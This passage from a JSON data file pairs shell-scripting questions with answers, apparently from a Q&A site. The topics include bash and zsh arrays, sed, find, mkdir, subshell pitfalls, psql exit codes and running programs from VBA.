    "Rename files recursively Mac OSX": "This has been asked: Recursive batch rename\nWith your example, you could go with:\nbrew install rename\nfind . -exec rename 's|foo|bar|' {} +",
    "What does #$ do in bash? (aka: Hash dollar sign, pound dollar sign)": "#$ does \"nothing\", as # is starting comment and everything behind it on the same line is ignored (with the notable exception of the \"shebang\").\n$# is a variable containing the number of arguments passed to a shell script (like $* is a variable containing all arguments).",
    "How to echo directories containing matching file with Bash?": "find . -name '*.class' -printf '%h\\n' | sort -u\nFrom man find:\n-printf format\n%h Leading directories of file\u2019s name (all but the last element). If the file name contains no slashes (since it is in the current directory) the %h specifier expands to \".\".",
    "Remove entry from array": "Gilles second answer is correct if you wish to remove all occurences, but it is a full reassignment of the array and does not address the situation where you wish to remove only a single entry, regardless of duplicates. There is a way in zsh to remove an element from an normal array without reassigning the entire array:\nGiven the following array:\narray=(abc def ghi)\nthe following will return the index of the first match for def:\n${array[(i)def]}\nand the following format can be used to remove any given indexed value (element index 2 in this example) in an array without reassignment of the entire array:\narray[2]=()\nthus, to remove the value def we combine the two:\narray[$array[(i)def]]=()\nThis is cleaner for single element removal, since there is no explicit array reassignment (cleaner in that any potential side effects, such as the accidental removal of empty items, quoted format issues, etc. are not going to crop up). However Gilles' solution is largely equivalent and has the advantage of multiple matching item removal, if that is what you want. With his method and this method, you have a full toolset for standard array element removal.",
    "How do I replace single quotes with another character in sed?": "Try to keep sed commands simple as much as possible. Otherwise you'll get confused of what you'd written reading it later.\n#!/bin/bash\nsed \"s/'/ /g\" myfile.txt",
    "While-loop subshell dilemma in Bash": "The problem is that the while loop is part of a pipeline. In a bash pipeline, every element of the pipeline is executed in its own subshell [ref]. So after the while loop terminates, the while loop subshell's copy of var is discarded, and the original var of the parent (whose value is unchanged) is echoed.\nOne way to fix this is by using Process Substitution as shown below:\nvar=0\nwhile read i;\ndo\n  # perform computations on $i\n  ((var++))\ndone < <(find . -type f -name \"*.bin\" -maxdepth 1)\nTake a look at BashFAQ/024 for other workarounds.\nNotice that I have also replaced ls with find because it is not good practice to parse ls.",
    "Easiest way to check for file extension in bash? [duplicate]": "You can do this with a simple regex, using the =~ operator inside a [[...]] test:\nif [[ $file =~ \\.gz$ ]];\nThis won't give you the right answer if the extension is .tgz, if you care about that. But it's easy to fix:\nif [[ $file =~ \\.t?gz$ ]];\nThe absence of quotes around the regex is necessary and important. You could quote $file but there is no point.\nIt would probably be better to use the file utility:\n$ file --mime-type something.gz\nsomething.gz: application/x-gzip\nSomething like:\nif file --mime-type \"$file\" | grep -q gzip$; then\n  echo \"$file is gzipped\"\nelse\n  echo \"$file is not gzipped\"\nfi",
    "ZSH for loop array variable issue": "It's actually much simpler than that:\nlw=('plugin1' 'plugin2' 'plugin3')\n\nfor i in $lw; do\n  . ~/Library/Rogall/plugins/$i/lw.prg end\ndone\nIn summary:\nAssign to foo, not $foo (the shell would try to expand $foo and assign to whatever it expands to; typically not useful)\nUse the loop variable directly; it contains the array value rather than the index",
    "How do I make multiple folders in a single location using relative path to the location?": "In Bash and other shells that support it, you can do\nmkdir ~/Labs/lab4a/folder{1..3}\nor\nmkdir ~/Labs/lab4a/folder{1,2,3}\nOther options:\nmkdir $(seq -f \"$HOME/Labs/lab4a/folder%03g\" 3)\n\nmkdir $(printf \"$HOME/Labs/lab4a/folder%03g \" {0..3})\nWhich will give you leading zeros which make sorting easier.\nThis will do the same thing in Bash 4:\nmkdir ~/Labs/lab4a/folder{001..3}",
    "Add a relative path to $PATH on fish startup": "The best way I have found to persistently add a path to your $PATH is\nset -U fish_user_paths $fish_user_paths ~/path/name\nThis prepends to $PATH. And since it's persistent, the path stays in $PATH on shell restarts.\nIt's more efficient than putting a command in your config.fish to modify your $PATH, because it only runs once compared to running on every shell restart.\nThe variable fish_user_paths is intended to be set by the user1, as stated by ridiculousfish, the maintainer of fish.\nConsider creating a fish function for convenience: 2\n# ~/.config/fish/functions/add_to_path.fish\nfunction add_to_path --description 'Persistently prepends paths to your PATH'\n  set --universal fish_user_paths $fish_user_paths $argv\nend\nAnd use it as:\n$ add_to_path foo bar  # Adds foo/ and bar/ to your PATH\nNotes\nOn that page the author gives the example set -U fish_user_paths ~/bin. This overwrites fish_user_paths with a single value of ~/bin. To avoid losing existing paths set in fish_user_paths, be sure to include $fish_user_paths in addition to any new paths being added (as seen in my answer).\nMy dotfiles contain a slightly more advanced version that skips adding duplicates https://github.com/dideler/dotfiles/blob/master/.config/fish/functions/add_to_user_path.fish",
    "How to append several lines of text in a file using a shell script": "You can use a here document:\ncat <<EOF >> outputfile\nsome lines\nof text\nEOF",
    "Get users home directory when they run a script as root": "Try to avoid eval. Especially with root perms.\nYou can do:\nUSER_HOME=$(getent passwd $SUDO_USER | cut -d: -f6)\nUpdate:\nhere is why to avoid eval.",
    "How can I use iterm as default terminal on macOS?": "(Open iTerm Build version 3.3.7)\nMenu: iTerm2 > Make iTerm2 Default Term",
    "How to get the Bash version number": "There's also a special array (BASH_VERSINFO) containing each version number in separate elements.\nif ((BASH_VERSINFO[0] < 3))\nthen\n  echo \"Sorry, you need at least bash-3.0 to run this script.\"\n  exit 1\nfi\nSee 9.1. Internal Variables for more information:\n# Bash version information:\n\nfor n in 0 1 2 3 4 5\ndo\n  echo \"BASH_VERSINFO[$n] = ${BASH_VERSINFO[$n]}\"\ndone\n\n# BASH_VERSINFO[0] = 3                      # Major version no.\n# BASH_VERSINFO[1] = 00                     # Minor version no.\n# BASH_VERSINFO[2] = 14                     # Patch level.\n# BASH_VERSINFO[3] = 1                      # Build version.\n# BASH_VERSINFO[4] = release                # Release status.\n# BASH_VERSINFO[5] = i386-redhat-linux-gnu  # Architecture\n                                            # (same as $MACHTYPE).",
    "How to exit a shell script if targeted file doesn't exist?": "You can check for file existence with something like:\nif [[ -f x.txt ]] ; then\n    echo file exists.\nfi\nTo exit if it doesn't, something like this would suffice:\nif [[ ! -f x.txt ]] ; then\n    echo 'File \"x.txt\" is not there, aborting.'\n    exit\nfi\nThe -f <file> is only one of the many conditional expressions you can use. If you look at the bash man-page under CONDITIONAL EXPRESSIONS, you'll see a whole host of them.\nIf (as stated in a question update) you wish to check if a wildcard results in files, you can simply expand it, throwing away the errors. If there are none, you'll end up with an empty string which can be detected with -z:\nif [[ -z \"$(ls -1 */*.txt 2>/dev/null | grep ab1)\" ]] ; then\n    echo 'There are no \"*/*.txt\" files.'\n    exit\nfi\nNote that I've used -1 to force one file per line even though Linux ls does that by default if the output device is not a terminal (from memory). That's just in case you try this on a machine that doesn't force one per line in that case.\nKeep in mind however that, if you have spaces in your filenames, using ls and then awk to extract column 1 is not going to work too well. For example, the file abc ab1.txt will result in the extraction of only the abc bit.\nUsing find with -print0, combined with xargs with -0 is the usual way to properly process files which may have \"special\" characters in them. There are many other options you can give to find to ensure only the files required are processed, such as -maxdepth to limit how far down the directory tree you go, and -name to properly filter file names.\nHowever, if you know that you will never have these types of files, it's probably okay to use the ls solution, just make sure you're comfortable with its shortcomings.",
    "Shell scripting: die on any error": "With standard sh and bash, you can\nset -e\nIt will\n$ help set\n...\n        -e  Exit immediately if a command exits with a non-zero status.\nIt also works (from what I could gather) with zsh. It also should work for any Bourne shell descendant.\nWith csh/tcsh, you have to launch your script with #!/bin/csh -e",
    "bash script to check if the current git branch = \"x\"": "Use git rev-parse --abbrev-ref HEAD to get the name of the current branch.\nThen it's only a matter of simply comparing values in your script:\nBRANCH=\"$(git rev-parse --abbrev-ref HEAD)\"\nif [[ \"$BRANCH\" != \"x\" ]]; then\n  echo 'Aborting script';\n  exit 1;\nfi\n\necho 'Do stuff';",
    "Is it possible to recursively create folders using a shell script?": "You should pass the -p parameter to mkdir so it will create all the subfolders. So following your example:\nmkdir -p folder1/folder2/folder3",
    "Cannot run adb shell \"date `date +%m%d%H%M%Y.%S`\"": "Inside the emulator goto Settings > Date & Time\nDeselect Automatic timezone.\nAdjust your timezone manually.\nDeselect automatic date & time and set correct time",
    "Check return status of psql command in unix shell scripting": "psql return code is documented as:\nEXIT STATUS\npsql returns 0 to the shell if it finished normally, 1 if a fatal error of its own occurs (e.g. out of memory, file not found), 2 if the connection to the server went bad and the session was not interactive, and 3 if an error occurred in a script and the variable ON_ERROR_STOP was set.\nYou probably just want to use ON_ERROR_STOP.\nFailure getting tested and reported to the shell:\n$ psql -d test -v \"ON_ERROR_STOP=1\" <<EOF\nselect error;\nselect 'OK';\nEOF\n\nERROR:  column \"error\" does not exist\nLINE 1: select error;\n\n$ echo $?\n3\nFailure getting ignored and not reported to the shell:\n$ psql -d test  <<EOF\nselect error;\nselect 'OK';\nEOF\nERROR:  column \"error\" does not exist\nLINE 1: select error;\n               ^\n ?column? \n----------\n OK\n(1 row)\n\n$ echo $?\n0",
    "How to cut first column (variable length) of a string in shell": "Many ways:\ncut -d' ' -f1 <filename # If field separator is space\ncut -f1 <filename  # If field separator is tab\ncut -d' ' -f1 <filename | cut -f1  # If field separator is space OR tab\nawk '{print $1}' filename\nwhile read x _ ; do echo $x ; done < filename",
    "Wait for Shell to finish, then format cells - synchronously execute a command": "Try the WshShell object instead of the native Shell function.\nDim wsh As Object\nSet wsh = VBA.CreateObject(\"WScript.Shell\")\nDim waitOnReturn As Boolean: waitOnReturn = True\nDim windowStyle As Integer: windowStyle = 1\nDim errorCode As Long\n\nerrorCode = wsh.Run(\"notepad.exe\", windowStyle, waitOnReturn)\n\nIf errorCode = 0 Then\n    MsgBox \"Done! No error to report.\"\nElse\n    MsgBox \"Program exited with error code \" & errorCode & \".\"\nEnd If    \nThough note that:\nIf bWaitOnReturn is set to false (the default), the Run method returns immediately after starting the program, automatically returning 0 (not to be interpreted as an error code).\nSo to detect whether the program executed successfully, you need waitOnReturn to be set to True as in my example above. Otherwise it will just return zero no matter what.\nFor early binding (gives access to Autocompletion), set a reference to \"Windows Script Host Object Model\" (Tools > Reference > set checkmark) and declare like this:\nDim wsh As WshShell \nSet wsh = New WshShell\nNow to run your process instead of Notepad... I expect your system will balk at paths containing space characters (...\\My Documents\\..., ...\\Program Files\\..., etc.), so you should enclose the path in \"quotes\":\nDim pth as String\npth = \"\"\"\" & ThisWorkbook.Path & \"\\ProcessData.exe\" & \"\"\"\"\nerrorCode = wsh.Run(pth , windowStyle, waitOnReturn)"
}